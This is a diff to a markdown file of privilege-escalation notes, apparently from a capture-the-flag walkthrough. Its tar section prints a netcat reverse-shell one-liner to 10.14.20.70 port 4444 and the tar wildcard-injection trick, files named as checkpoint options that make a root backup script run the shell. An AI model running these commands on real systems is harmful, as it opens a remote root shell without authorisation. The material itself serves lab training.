@@ -71,7 +71,7 @@ Be sure the file has `chmod +x`
 ### tar
 
 ```console
-cat backup.sh
+$ cat backup.sh
 #!/bin/bash
 cd /var/www/html
 tar cf /home/milesdyson/backups/backup.tgz *
@@ -83,12 +83,6 @@ $ echo "mkfifo /tmp/ahikccu; nc 10.14.20.70 4444 0</tmp/ahikccu | /bin/sh >/tmp/
 $ chmod 777 shell.sh
 $ echo "" > "--checkpoint-action=exec=sh shell.sh"
 $ echo "" > --checkpoint=1
-```
-
-start nc listener
-
-```console
-$ sudo /opt/backups/backup.sh
 ```
 
 ## Environment var
